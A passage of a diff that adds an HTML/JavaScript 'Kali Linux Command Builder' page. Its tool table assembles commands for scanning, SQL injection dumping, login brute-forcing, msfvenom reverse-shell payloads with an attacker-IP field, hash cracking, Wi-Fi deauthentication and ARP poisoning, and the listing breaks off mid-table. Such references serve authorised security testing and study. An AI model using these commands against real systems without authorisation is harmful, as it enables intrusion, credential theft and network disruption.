@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kali Linux Command Builder</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0d1117; color: #c9d1d9; min-height: 100vh; }
+  header { background: #161b22; border-bottom: 1px solid #30363d; padding: 12px 20px; display: flex; align-items: center; gap: 12px; }
+  header svg { width: 32px; height: 32px; }
+  header h1 { font-size: 18px; font-weight: 600; color: #e6edf3; }
+  header span { font-size: 12px; color: #7d8590; margin-left: auto; }
+  .layout { display: grid; grid-template-columns: 240px 1fr; height: calc(100vh - 57px); }
+  .sidebar { background: #161b22; border-right: 1px solid #30363d; overflow-y: auto; }
+  .cat-header { padding: 10px 14px; font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.8px; color: #7d8590; border-bottom: 1px solid #21262d; background: #0d1117; position: sticky; top: 0; z-index: 1; }
+  .cat-btn { display: flex; align-items: center; gap: 8px; width: 100%; padding: 9px 14px; background: none; border: none; color: #8b949e; cursor: pointer; font-size: 13px; text-align: left; transition: all 0.15s; border-left: 3px solid transparent; }
+  .cat-btn:hover { background: #21262d; color: #c9d1d9; }
+  .cat-btn.active { background: #1f2937; color: #58a6ff; border-left-color: #58a6ff; }
+  .cat-btn .icon { width: 18px; font-size: 14px; text-align: center; }
+  .main { display: flex; flex-direction: column; overflow: hidden; }
+  .toolbar { padding: 12px 16px; background: #161b22; border-bottom: 1px solid #30363d; display: flex; gap: 10px; align-items: center; }
+  .search-box { flex: 1; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 7px 12px; color: #c9d1d9; font-size: 13px; }
+  .search-box:focus { outline: none; border-color: #58a6ff; }
+  .search-box::placeholder { color: #484f58; }
+  .content-area { display: grid; grid-template-columns: 1fr 340px; flex: 1; overflow: hidden; }
+  .tools-panel { overflow-y: auto; padding: 16px; }
+  .section-title { font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.8px; color: #7d8590; margin-bottom: 10px; padding-bottom: 6px; border-bottom: 1px solid #21262d; }
+  .tool-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 8px; margin-bottom: 20px; }
+  .tool-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 10px 12px; cursor: pointer; transition: all 0.15s; }
+  .tool-card:hover { border-color: #58a6ff; background: #1c2333; }
+  .tool-card.selected { border-color: #58a6ff; background: #1c2333; box-shadow: 0 0 0 1px #58a6ff33; }
+  .tool-name { font-size: 13px; font-weight: 600; color: #e6edf3; margin-bottom: 2px; }
+  .tool-desc { font-size: 11px; color: #7d8590; line-height: 1.4; }
+  .tool-badge { display: inline-block; font-size: 10px; padding: 1px 6px; border-radius: 10px; margin-top: 5px; }
+  .badge-scan { background: #1f3a5f; color: #58a6ff; }
+  .badge-exploit { background: #3d1a1a; color: #f85149; }
+  .badge-pass { background: #1a3d2b; color: #3fb950; }
+  .badge-wifi { background: #2d1f5e; color: #a78bfa; }
+  .badge-web { background: #3d2a1a; color: #e3b341; }
+  .badge-forensics { background: #1a3d3d; color: #39d353; }
+  .badge-recon { background: #1f3f3f; color: #2ea9a1; }
+  .badge-misc { background: #30363d; color: #8b949e; }
+  .right-panel { background: #161b22; border-left: 1px solid #30363d; display: flex; flex-direction: column; overflow: hidden; }
+  .options-area { flex: 1; overflow-y: auto; padding: 14px; }
+  .options-title { font-size: 12px; font-weight: 600; color: #8b949e; text-transform: uppercase; letter-spacing: 0.6px; margin-bottom: 12px; }
+  .opt-group { margin-bottom: 14px; }
+  .opt-label { font-size: 12px; color: #8b949e; margin-bottom: 5px; display: block; }
+  .opt-input { width: 100%; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 7px 10px; color: #c9d1d9; font-size: 13px; }
+  .opt-input:focus { outline: none; border-color: #58a6ff; }
+  .opt-check { display: flex; align-items: center; gap: 7px; margin-bottom: 6px; cursor: pointer; }
+  .opt-check input[type=checkbox] { accent-color: #58a6ff; width: 14px; height: 14px; cursor: pointer; }
+  .opt-check label { font-size: 13px; color: #c9d1d9; cursor: pointer; }
+  .opt-check span.flag { font-size: 11px; color: #484f58; font-family: monospace; margin-left: auto; }
+  .opt-select { width: 100%; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 7px 10px; color: #c9d1d9; font-size: 13px; }
+  .opt-select:focus { outline: none; border-color: #58a6ff; }
+  .cmd-area { background: #0d1117; border-top: 1px solid #30363d; padding: 12px 14px; }
+  .cmd-label { font-size: 11px; color: #7d8590; margin-bottom: 6px; display: flex; align-items: center; justify-content: space-between; }
+  .cmd-box { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 10px 12px; font-family: 'Courier New', monospace; font-size: 13px; color: #79c0ff; word-break: break-all; min-height: 50px; line-height: 1.6; }
+  .btn-row { display: flex; gap: 8px; margin-top: 10px; }
+  .btn { padding: 7px 14px; border-radius: 6px; border: 1px solid #30363d; background: #21262d; color: #c9d1d9; font-size: 12px; cursor: pointer; transition: all 0.15s; }
+  .btn:hover { background: #30363d; }
+  .btn-primary { background: #1f6feb; border-color: #1f6feb; color: #fff; }
+  .btn-primary:hover { background: #388bfd; border-color: #388bfd; }
+  .btn-danger { background: #21262d; border-color: #f85149; color: #f85149; }
+  .btn-danger:hover { background: #3d1a1a; }
+  .placeholder { text-align: center; padding: 40px 20px; color: #484f58; }
+  .placeholder svg { width: 48px; height: 48px; margin: 0 auto 12px; display: block; opacity: 0.3; }
+  .placeholder p { font-size: 14px; }
+  .no-results { padding: 30px; text-align: center; color: #484f58; font-size: 13px; }
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 3px; }
+  .history-tag { display: inline-flex; align-items: center; gap: 5px; background: #21262d; border: 1px solid #30363d; border-radius: 20px; padding: 3px 10px; font-size: 11px; color: #8b949e; cursor: pointer; margin: 3px; transition: all 0.15s; }
+  .history-tag:hover { border-color: #58a6ff; color: #58a6ff; }
+  .history-section { padding: 10px 14px; border-top: 1px solid #21262d; }
+  .history-section .sec-lbl { font-size: 10px; text-transform: uppercase; letter-spacing: 0.6px; color: #484f58; margin-bottom: 6px; }
+</style>
+</head>
+<body>
+
+<header>
+  <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+    <circle cx="50" cy="50" r="48" fill="#1a1a2e" stroke="#4a9fd4" stroke-width="3"/>
+    <path d="M50 15 L75 35 L75 65 L50 85 L25 65 L25 35 Z" fill="none" stroke="#4a9fd4" stroke-width="2.5"/>
+    <circle cx="50" cy="50" r="12" fill="#4a9fd4"/>
+    <line x1="50" y1="15" x2="50" y2="38" stroke="#4a9fd4" stroke-width="2"/>
+    <line x1="75" y1="35" x2="59" y2="44" stroke="#4a9fd4" stroke-width="2"/>
+    <line x1="75" y1="65" x2="59" y2="56" stroke="#4a9fd4" stroke-width="2"/>
+    <line x1="50" y1="85" x2="50" y2="62" stroke="#4a9fd4" stroke-width="2"/>
+    <line x1="25" y1="65" x2="41" y2="56" stroke="#4a9fd4" stroke-width="2"/>
+    <line x1="25" y1="35" x2="41" y2="44" stroke="#4a9fd4" stroke-width="2"/>
+  </svg>
+  <h1>Kali Linux Command Builder</h1>
+  <span>Select a tool &rarr; configure options &rarr; copy command</span>
+</header>
+
+<div class="layout">
+  <div class="sidebar">
+    <div class="cat-header">Categories</div>
+    <div id="catList"></div>
+  </div>
+  <div class="main">
+    <div class="toolbar">
+      <input class="search-box" id="searchBox" placeholder="Search tools... (e.g. nmap, sqlmap, aircrack)" oninput="filterTools()">
+      <button class="btn" onclick="clearAll()">Clear All</button>
+    </div>
+    <div class="content-area">
+      <div class="tools-panel" id="toolsPanel"></div>
+      <div class="right-panel">
+        <div class="options-area" id="optionsArea">
+          <div class="placeholder">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M9 3H5a2 2 0 00-2 2v4m6-6h10a2 2 0 012 2v4M9 3v18m0 0h10a2 2 0 002-2V9M9 21H5a2 2 0 01-2-2V9m0 0h18"/></svg>
+            <p>Select a tool to configure options and build your command</p>
+          </div>
+        </div>
+        <div class="cmd-area">
+          <div class="cmd-label">
+            <span>Generated Command</span>
+            <span id="cmdStatus" style="color:#3fb950"></span>
+          </div>
+          <div class="cmd-box" id="cmdBox">Select a tool to get started...</div>
+          <div class="btn-row">
+            <button class="btn btn-primary" onclick="copyCmd()" style="flex:1">Copy Command</button>
+            <button class="btn" onclick="addToHistory()">Save</button>
+            <button class="btn btn-danger" onclick="resetOptions()">Reset</button>
+          </div>
+        </div>
+        <div class="history-section" id="historySection" style="display:none">
+          <div class="sec-lbl">Saved Commands</div>
+          <div id="historyList"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+const TOOLS = {
+  "Information Gathering": {
+    icon: "🔍", badge: "badge-recon",
+    tools: [
+      { name: "nmap", desc: "Network scanner & port mapper", badge: "badge-scan",
+        opts: [
+          { type: "input", flag: "-p", label: "Ports (e.g. 80,443 or 1-1000)", placeholder: "22,80,443" },
+          { type: "input", flag: "", label: "Target IP / Range", placeholder: "192.168.1.0/24", key: "target" },
+          { type: "check", flag: "-sV", label: "Service version detection" },
+          { type: "check", flag: "-sS", label: "SYN stealth scan" },
+          { type: "check", flag: "-sU", label: "UDP scan" },
+          { type: "check", flag: "-O", label: "OS detection" },
+          { type: "check", flag: "-A", label: "Aggressive scan (OS+Version+Scripts)" },
+          { type: "check", flag: "-Pn", label: "Skip host discovery" },
+          { type: "check", flag: "--open", label: "Show only open ports" },
+          { type: "select", flag: "-T", label: "Timing template", options: ["","0 (Paranoid)","1 (Sneaky)","2 (Polite)","3 (Normal)","4 (Aggressive)","5 (Insane)"] },
+          { type: "input", flag: "-oN", label: "Output file (normal)", placeholder: "scan.txt" },
+          { type: "check", flag: "-v", label: "Verbose output" },
+          { type: "check", flag: "--script vuln", label: "Run vuln scripts" },
+        ]
+      },
+      { name: "whois", desc: "Domain registration lookup", badge: "badge-recon",
+        opts: [
+          { type: "input", flag: "", label: "Domain / IP", placeholder: "example.com", key: "target" },
+          { type: "input", flag: "-h", label: "WHOIS server", placeholder: "whois.arin.net" },
+        ]
+      },
+      { name: "dig", desc: "DNS lookup utility", badge: "badge-recon",
+        opts: [
+          { type: "input", flag: "", label: "Domain", placeholder: "example.com", key: "target" },
+          { type: "select", flag: "", label: "Query type", key: "qtype", options: ["A","AAAA","MX","NS","TXT","CNAME","SOA","ANY"] },
+          { type: "input", flag: "@", label: "DNS Server", placeholder: "8.8.8.8" },
+          { type: "check", flag: "+short", label: "Short output" },
+          { type: "check", flag: "+trace", label: "Trace delegation" },
+        ]
+      },
+      { name: "theHarvester", desc: "OSINT email & subdomain harvester", badge: "badge-recon",
+        opts: [
+          { type: "input", flag: "-d", label: "Domain", placeholder: "example.com" },
+          { type: "select", flag: "-b", label: "Source", options: ["google","bing","linkedin","twitter","shodan","all"] },
+          { type: "input", flag: "-l", label: "Limit results", placeholder: "100" },
+          { type: "input", flag: "-f", label: "Save results to", placeholder: "output.html" },
+        ]
+      },
+      { name: "maltego", desc: "Visual link analysis OSINT tool", badge: "badge-recon",
+        opts: [
+          { type: "input", flag: "", label: "Target Entity", placeholder: "example.com", key: "target" },
+        ]
+      },
+      { name: "recon-ng", desc: "Full-featured web reconnaissance framework", badge: "badge-recon",
+        opts: [
+          { type: "check", flag: "-r", label: "Run script" },
+          { type: "input", flag: "-w", label: "Workspace name", placeholder: "myworkspace" },
+        ]
+      },
+      { name: "fierce", desc: "DNS brute force & subdomain scanner", badge: "badge-recon",
+        opts: [
+          { type: "input", flag: "--domain", label: "Domain", placeholder: "example.com" },
+          { type: "input", flag: "--wordlist", label: "Wordlist path", placeholder: "/usr/share/wordlists/fierce/hosts.txt" },
+          { type: "input", flag: "--output", label: "Output file", placeholder: "results.txt" },
+          { type: "input", flag: "--threads", label: "Threads", placeholder: "10" },
+        ]
+      },
+      { name: "netdiscover", desc: "ARP network scanner", badge: "badge-scan",
+        opts: [
+          { type: "input", flag: "-r", label: "IP Range", placeholder: "192.168.1.0/24" },
+          { type: "input", flag: "-i", label: "Interface", placeholder: "eth0" },
+          { type: "check", flag: "-p", label: "Passive mode (no send)" },
+        ]
+      },
+      { name: "amass", desc: "In-depth attack surface mapping", badge: "badge-recon",
+        opts: [
+          { type: "select", flag: "", label: "Subcommand", key: "sub", options: ["enum","intel","db","viz"] },
+          { type: "input", flag: "-d", label: "Domain", placeholder: "example.com" },
+          { type: "check", flag: "-passive", label: "Passive mode" },
+          { type: "check", flag: "-active", label: "Active mode" },
+          { type: "input", flag: "-o", label: "Output file", placeholder: "amass_out.txt" },
+        ]
+      },
+    ]
+  },
+  "Vulnerability Analysis": {
+    icon: "🛡️", badge: "badge-scan",
+    tools: [
+      { name: "nikto", desc: "Web server vulnerability scanner", badge: "badge-web",
+        opts: [
+          { type: "input", flag: "-h", label: "Target host", placeholder: "http://192.168.1.1" },
+          { type: "input", flag: "-p", label: "Port", placeholder: "80" },
+          { type: "check", flag: "-ssl", label: "Force SSL" },
+          { type: "input", flag: "-o", label: "Output file", placeholder: "nikto_out.txt" },
+          { type: "select", flag: "-Format", label: "Output format", options: ["txt","html","csv","xml"] },
+          { type: "input", flag: "-Tuning", label: "Tuning (e.g. 1234)", placeholder: "1234" },
+          { type: "check", flag: "-C all", label: "Check all CGIs" },
+        ]
+      },
+      { name: "openvas", desc: "Open Vulnerability Assessment Scanner", badge: "badge-scan",
+        opts: [
+          { type: "input", flag: "--target", label: "Target", placeholder: "192.168.1.1" },
+        ]
+      },
+      { name: "lynis", desc: "Security audit tool for Unix systems", badge: "badge-scan",
+        opts: [
+          { type: "select", flag: "", label: "Mode", key: "sub", options: ["audit system","audit system --quick","update info","show commands"] },
+          { type: "check", flag: "--pentest", label: "Non-privileged scan" },
+          { type: "check", flag: "--auditor", label: "Specify auditor name" },
+        ]
+      },
+      { name: "wpscan", desc: "WordPress vulnerability scanner", badge: "badge-web",
+        opts: [
+          { type: "input", flag: "--url", label: "WordPress URL", placeholder: "http://example.com" },
+          { type: "select", flag: "--enumerate", label: "Enumerate", options: ["u","p","t","ap","at","tt","cb","dbe","u,ap"] },
+          { type: "input", flag: "--api-token", label: "WPScan API token", placeholder: "YOUR_API_TOKEN" },
+          { type: "input", flag: "--passwords", label: "Password wordlist", placeholder: "/usr/share/wordlists/rockyou.txt" },
+          { type: "check", flag: "--random-user-agent", label: "Random user agent" },
+        ]
+      },
+    ]
+  },
+  "Web Application": {
+    icon: "🌐", badge: "badge-web",
+    tools: [
+      { name: "sqlmap", desc: "Automated SQL injection tool", badge: "badge-web",
+        opts: [
+          { type: "input", flag: "-u", label: "Target URL", placeholder: "http://site.com/page?id=1" },
+          { type: "input", flag: "--data", label: "POST data", placeholder: "user=x&pass=y" },
+          { type: "select", flag: "--level", label: "Level (1-5)", options: ["1","2","3","4","5"] },
+          { type: "select", flag: "--risk", label: "Risk (1-3)", options: ["1","2","3"] },
+          { type: "check", flag: "--dbs", label: "Enumerate databases" },
+          { type: "check", flag: "--tables", label: "Enumerate tables" },
+          { type: "check", flag: "--dump", label: "Dump data" },
+          { type: "input", flag: "-D", label: "Database name", placeholder: "mydb" },
+          { type: "input", flag: "-T", label: "Table name", placeholder: "users" },
+          { type: "check", flag: "--batch", label: "Never ask for user input" },
+          { type: "check", flag: "--random-agent", label: "Random user agent" },
+          { type: "input", flag: "--proxy", label: "Proxy", placeholder: "http://127.0.0.1:8080" },
+        ]
+      },
+      { name: "burpsuite", desc: "Web security testing platform", badge: "badge-web",
+        opts: [
+          { type: "check", flag: "--unpause-spider", label: "Unpause spider on startup" },
+          { type: "input", flag: "--project-file", label: "Project file", placeholder: "project.burp" },
+        ]
+      },
+      { name: "dirb", desc: "Web content scanner / dir bruteforcer", badge: "badge-web",
+        opts: [
+          { type: "input", flag: "", label: "Target URL", placeholder: "http://192.168.1.1/", key: "target" },
+          { type: "input", flag: "", label: "Wordlist", placeholder: "/usr/share/wordlists/dirb/common.txt", key: "wordlist" },
+          { type: "input", flag: "-o", label: "Output file", placeholder: "dirb_output.txt" },
+          { type: "check", flag: "-r", label: "Non-recursive" },
+          { type: "check", flag: "-S", label: "Silent mode" },
+          { type: "input", flag: "-X", label: "Extensions", placeholder: ".php,.html,.js" },
+        ]
+      },
+      { name: "gobuster", desc: "URI / DNS / S3 bruteforcer", badge: "badge-web",
+        opts: [
+          { type: "select", flag: "", label: "Mode", key: "sub", options: ["dir","dns","s3","vhost"] },
+          { type: "input", flag: "-u", label: "URL / Domain", placeholder: "http://example.com" },
+          { type: "input", flag: "-w", label: "Wordlist", placeholder: "/usr/share/wordlists/dirbuster/medium.txt" },
+          { type: "input", flag: "-x", label: "Extensions", placeholder: "php,html,txt" },
+          { type: "input", flag: "-t", label: "Threads", placeholder: "50" },
+          { type: "check", flag: "-q", label: "Quiet mode" },
+          { type: "input", flag: "-o", label: "Output file", placeholder: "gobuster.txt" },
+        ]
+      },
+      { name: "ffuf", desc: "Fast web fuzzer written in Go", badge: "badge-web",
+        opts: [
+          { type: "input", flag: "-u", label: "URL (use FUZZ keyword)", placeholder: "http://site.com/FUZZ" },
+          { type: "input", flag: "-w", label: "Wordlist", placeholder: "/usr/share/wordlists/dirbuster/medium.txt" },
+          { type: "input", flag: "-t", label: "Threads", placeholder: "40" },
+          { type: "input", flag: "-mc", label: "Match status codes", placeholder: "200,301,302" },
+          { type: "input", flag: "-fc", label: "Filter status codes", placeholder: "404" },
+          { type: "check", flag: "-r", label: "Follow redirects" },
+          { type: "input", flag: "-o", label: "Output file", placeholder: "ffuf_out.json" },
+          { type: "input", flag: "-H", label: "Header", placeholder: "Authorization: Bearer token" },
+        ]
+      },
+      { name: "hydra", desc: "Fast login brute-force tool", badge: "badge-pass",
+        opts: [
+          { type: "input", flag: "-l", label: "Username (single)", placeholder: "admin" },
+          { type: "input", flag: "-L", label: "Username list file", placeholder: "/usr/share/wordlists/users.txt" },
+          { type: "input", flag: "-p", label: "Password (single)", placeholder: "password123" },
+          { type: "input", flag: "-P", label: "Password list file", placeholder: "/usr/share/wordlists/rockyou.txt" },
+          { type: "input", flag: "-s", label: "Port", placeholder: "22" },
+          { type: "select", flag: "", label: "Service", key: "service", options: ["ssh","ftp","http-get","http-post-form","smtp","rdp","mysql","mssql","vnc","telnet"] },
+          { type: "input", flag: "", label: "Target IP", placeholder: "192.168.1.1", key: "target" },
+          { type: "input", flag: "-t", label: "Parallel tasks", placeholder: "16" },
+          { type: "check", flag: "-v", label: "Verbose" },
+        ]
+      },
+      { name: "medusa", desc: "Parallel brute-force login tool", badge: "badge-pass",
+        opts: [
+          { type: "input", flag: "-h", label: "Target host", placeholder: "192.168.1.1" },
+          { type: "input", flag: "-u", label: "Username", placeholder: "admin" },
+          { type: "input", flag: "-P", label: "Password wordlist", placeholder: "/usr/share/wordlists/rockyou.txt" },
+          { type: "select", flag: "-M", label: "Module", options: ["ssh","ftp","http","rdp","mysql","telnet","smtp","pop3","vnc"] },
+          { type: "input", flag: "-t", label: "Threads", placeholder: "16" },
+        ]
+      },
+    ]
+  },
+  "Exploitation": {
+    icon: "💥", badge: "badge-exploit",
+    tools: [
+      { name: "msfconsole", desc: "Metasploit Framework console", badge: "badge-exploit",
+        opts: [
+          { type: "check", flag: "-q", label: "Quiet mode (no banner)" },
+          { type: "input", flag: "-r", label: "Run resource script", placeholder: "setup.rc" },
+          { type: "input", flag: "-x", label: "Execute commands on startup", placeholder: "use exploit/..." },
+        ]
+      },
+      { name: "msfvenom", desc: "Payload generator / encoder", badge: "badge-exploit",
+        opts: [
+          { type: "select", flag: "-p", label: "Payload", options: ["windows/meterpreter/reverse_tcp","windows/shell_reverse_tcp","linux/x86/meterpreter/reverse_tcp","linux/x64/shell_reverse_tcp","php/meterpreter/reverse_tcp","android/meterpreter/reverse_tcp","python/meterpreter/reverse_tcp"] },
+          { type: "input", flag: "LHOST=", label: "LHOST (attacker IP)", placeholder: "192.168.1.10", key: "lhost" },
+          { type: "input", flag: "LPORT=", label: "LPORT", placeholder: "4444", key: "lport" },
+          { type: "select", flag: "-f", label: "Format", options: ["exe","elf","raw","py","php","asp","aspx","war","jar","apk","bash","psh","c"] },
+          { type: "input", flag: "-e", label: "Encoder", placeholder: "x86/shikata_ga_nai" },
+          { type: "input", flag: "-i", label: "Encoding iterations", placeholder: "5" },
+          { type: "input", flag: "-o", label: "Output file", placeholder: "payload.exe" },
+          { type: "check", flag: "-b '\\x00'", label: "Bad chars null byte" },
+        ]
+      },
+      { name: "searchsploit", desc: "Exploit-DB offline search", badge: "badge-exploit",
+        opts: [
+          { type: "input", flag: "", label: "Search term", placeholder: "apache 2.4", key: "target" },
+          { type: "check", flag: "-t", label: "Search title only" },
+          { type: "check", flag: "-x", label: "Examine exploit" },
+          { type: "check", flag: "--cve", label: "Search by CVE" },
+        ]
+      },
+      { name: "sqlninja", desc: "SQL Server injection & takeover", badge: "badge-exploit",
+        opts: [
+          { type: "select", flag: "-m", label: "Mode", options: ["t","f","b","d","s","x","c","k"] },
+          { type: "input", flag: "-f", label: "Config file", placeholder: "sqlninja.conf" },
+        ]
+      },
+      { name: "beef-xss", desc: "Browser Exploitation Framework", badge: "badge-exploit",
+        opts: [
+          { type: "check", flag: "-x", label: "Restore DB on startup" },
+          { type: "check", flag: "-v", label: "Verbose" },
+        ]
+      },
+    ]
+  },
+  "Password Attacks": {
+    icon: "🔑", badge: "badge-pass",
+    tools: [
+      { name: "hashcat", desc: "Advanced password hash cracker", badge: "badge-pass",
+        opts: [
+          { type: "input", flag: "", label: "Hash file", placeholder: "hashes.txt", key: "target" },
+          { type: "select", flag: "-m", label: "Hash type", options: ["0 (MD5)","100 (SHA1)","1400 (SHA2-256)","1700 (SHA2-512)","1000 (NTLM)","3200 (bcrypt)","500 (md5crypt)","5500 (NTLMv1)","5600 (NTLMv2)"] },
+          { type: "select", flag: "-a", label: "Attack mode", options: ["0 (Dictionary)","1 (Combination)","3 (Brute-force)","6 (Dict+Mask)","7 (Mask+Dict)"] },
+          { type: "input", flag: "", label: "Wordlist / Mask", placeholder: "/usr/share/wordlists/rockyou.txt", key: "wordlist" },
+          { type: "check", flag: "--show", label: "Show cracked hashes" },
+          { type: "check", flag: "--force", label: "Ignore OpenCL warnings" },
+          { type: "input", flag: "-r", label: "Rules file", placeholder: "/usr/share/hashcat/rules/best64.rule" },
+          { type: "input", flag: "-o", label: "Output file", placeholder: "cracked.txt" },
+          { type: "input", flag: "--session", label: "Session name", placeholder: "mysession" },
+          { type: "check", flag: "--restore", label: "Restore session" },
+        ]
+      },
+      { name: "john", desc: "John the Ripper password cracker", badge: "badge-pass",
+        opts: [
+          { type: "input", flag: "", label: "Hash file", placeholder: "shadow.txt", key: "target" },
+          { type: "input", flag: "--wordlist=", label: "Wordlist", placeholder: "/usr/share/wordlists/rockyou.txt" },
+          { type: "input", flag: "--format=", label: "Hash format", placeholder: "sha512crypt" },
+          { type: "input", flag: "--rules=", label: "Rules", placeholder: "Jumbo" },
+          { type: "check", flag: "--show", label: "Show cracked passwords" },
+          { type: "check", flag: "--incremental", label: "Incremental mode" },
+        ]
+      },
+      { name: "crunch", desc: "Custom wordlist generator", badge: "badge-pass",
+        opts: [
+          { type: "input", flag: "", label: "Min length", placeholder: "6", key: "min" },
+          { type: "input", flag: "", label: "Max length", placeholder: "8", key: "max" },
+          { type: "input", flag: "", label: "Charset (e.g. abcdef123)", placeholder: "abcdefghijklmnopqrstuvwxyz0123456789", key: "charset" },
+          { type: "input", flag: "-o", label: "Output file", placeholder: "wordlist.txt" },
+          { type: "input", flag: "-t", label: "Pattern (@ lower, , upper, % digit, ^ symbol)", placeholder: "@@@@@@" },
+        ]
+      },
+      { name: "ophcrack", desc: "Windows password cracker using rainbow tables", badge: "badge-pass",
+        opts: [
+          { type: "check", flag: "-g", label: "GUI mode" },
+        ]
+      },
+      { name: "fcrackzip", desc: "ZIP password cracker", badge: "badge-pass",
+        opts: [
+          { type: "input", flag: "", label: "ZIP file", placeholder: "archive.zip", key: "target" },
+          { type: "select", flag: "-m", label: "Method", options: ["crypt","zip"] },
+          { type: "check", flag: "-u", label: "Use unzip to verify" },
+          { type: "input", flag: "-D -p", label: "Dictionary file", placeholder: "/usr/share/wordlists/rockyou.txt" },
+          { type: "input", flag: "-b -c", label: "Charset", placeholder: "a1" },
+          { type: "input", flag: "-l", label: "Length range", placeholder: "4-8" },
+        ]
+      },
+    ]
+  },
+  "Wireless Attacks": {
+    icon: "📡", badge: "badge-wifi",
+    tools: [
+      { name: "aircrack-ng", desc: "WiFi network security auditing suite", badge: "badge-wifi",
+        opts: [
+          { type: "input", flag: "", label: "Capture file", placeholder: "capture.cap", key: "target" },
+          { type: "input", flag: "-w", label: "Wordlist", placeholder: "/usr/share/wordlists/rockyou.txt" },
+          { type: "input", flag: "-b", label: "BSSID", placeholder: "AA:BB:CC:DD:EE:FF" },
+          { type: "input", flag: "-e", label: "SSID (network name)", placeholder: "MyWiFi" },
+        ]
+      },
+      { name: "airmon-ng", desc: "Enable/disable monitor mode on wireless interface", badge: "badge-wifi",
+        opts: [
+          { type: "select", flag: "", label: "Action", key: "sub", options: ["start","stop","check","check kill"] },
+          { type: "input", flag: "", label: "Interface", placeholder: "wlan0", key: "target" },
+          { type: "input", flag: "", label: "Channel (optional)", placeholder: "6", key: "chan" },
+        ]
+      },
+      { name: "airodump-ng", desc: "Capture raw 802.11 frames", badge: "badge-wifi",
+        opts: [
+          { type: "input", flag: "", label: "Interface", placeholder: "wlan0mon", key: "target" },
+          { type: "input", flag: "--bssid", label: "BSSID filter", placeholder: "AA:BB:CC:DD:EE:FF" },
+          { type: "input", flag: "-c", label: "Channel", placeholder: "6" },
+          { type: "input", flag: "-w", label: "Write output to", placeholder: "capture" },
+          { type: "check", flag: "--wps", label: "Show WPS info" },
+        ]
+      },
+      { name: "aireplay-ng", desc: "Inject frames into wireless networks", badge: "badge-wifi",
+        opts: [
+          { type: "select", flag: "", label: "Attack", key: "atk", options: ["--deauth 10 -a <BSSID>","--fakeauth 0 -e <SSID> -a <BSSID>","--arpreplay -b <BSSID>","--chopchop -b <BSSID>","--fragment -b <BSSID>"] },
+          { type: "input", flag: "", label: "Interface", placeholder: "wlan0mon", key: "target" },
+        ]
+      },
+      { name: "reaver", desc: "WPS PIN brute-force attack", badge: "badge-wifi",
+        opts: [
+          { type: "input", flag: "-i", label: "Interface", placeholder: "wlan0mon" },
+          { type: "input", flag: "-b", label: "BSSID", placeholder: "AA:BB:CC:DD:EE:FF" },
+          { type: "check", flag: "-v", label: "Verbose" },
+          { type: "check", flag: "-K 1", label: "Pixie Dust attack" },
+          { type: "input", flag: "-c", label: "Channel", placeholder: "6" },
+          { type: "input", flag: "--delay=", label: "Delay between pins (s)", placeholder: "1" },
+        ]
+      },
+      { name: "wifite", desc: "Automated wireless attack tool", badge: "badge-wifi",
+        opts: [
+          { type: "check", flag: "--wpa", label: "WPA/WPA2 targets only" },
+          { type: "check", flag: "--wps", label: "WPS targets only" },
+          { type: "input", flag: "-i", label: "Interface", placeholder: "wlan0" },
+          { type: "input", flag: "--wordlist", label: "Wordlist", placeholder: "/usr/share/wordlists/rockyou.txt" },
+        ]
+      },
+    ]
+  },
+  "Sniffing & Spoofing": {
+    icon: "👁️", badge: "badge-scan",
+    tools: [
+      { name: "wireshark", desc: "GUI network protocol analyzer", badge: "badge-scan",
+        opts: [
+          { type: "input", flag: "-i", label: "Interface", placeholder: "eth0" },
+          { type: "input", flag: "-f", label: "Capture filter", placeholder: "tcp port 80" },
+          { type: "input", flag: "-w", label: "Write to file", placeholder: "capture.pcap" },
+          { type: "check", flag: "-k", label: "Start capturing immediately" },
+        ]
+      },
+      { name: "tcpdump", desc: "Command-line packet analyzer", badge: "badge-scan",
+        opts: [
+          { type: "input", flag: "-i", label: "Interface", placeholder: "eth0" },
+          { type: "input", flag: "", label: "Filter expression", placeholder: "tcp port 80 and host 192.168.1.1", key: "filter" },
+          { type: "input", flag: "-w", label: "Write to file", placeholder: "capture.pcap" },
+          { type: "check", flag: "-v", label: "Verbose" },
+          { type: "check", flag: "-n", label: "Numeric output (no DNS)" },
+          { type: "input", flag: "-c", label: "Packet count", placeholder: "100" },
+        ]
+      },
+      { name: "ettercap", desc: "MITM attacks on LAN", badge: "badge-scan",
+        opts: [
+          { type: "check", flag: "-T", label: "Text only interface" },
+          { type: "check", flag: "-G", label: "GUI interface" },
+          { type: "input", flag: "-i", label: "Interface", placeholder: "eth0" },
+          { type: "check", flag: "-M arp:remote", label: "ARP poisoning (MITM)" },
+          { type: "input", flag: "", label: "Target 1 /MAC/", placeholder: "/192.168.1.1//", key: "t1" },
+          { type: "input", flag: "", label: "Target 2 /MAC/", placeholder: "/192.168.1.100//", key: "t2" },
+        ]
+      },
+      { name: "arpspoof", desc: "ARP cache poisoning tool", badge: "badge-scan",
+        opts: [
+          { type: "input", flag: "-i", label: "Interface", placeholder: "eth0" },
+          { type: "input", flag: "-t", label: "Target IP", placeholder: "192.168.1.100" },
+          { type: "input", flag: "", label: "Impersonate IP (gateway)", placeholder: "192.168.1.1", key: "target" },
+        ]
+      },
+      { name: "mitmproxy", desc: "Interactive HTTPS proxy", badge: "badge-web",
+        opts: [
+          { type: "input", flag: "-p", label: "Port", placeholder: "8080" },
+          { type: "input", flag: "-i", label: "Interface", placeholder: "eth0" },
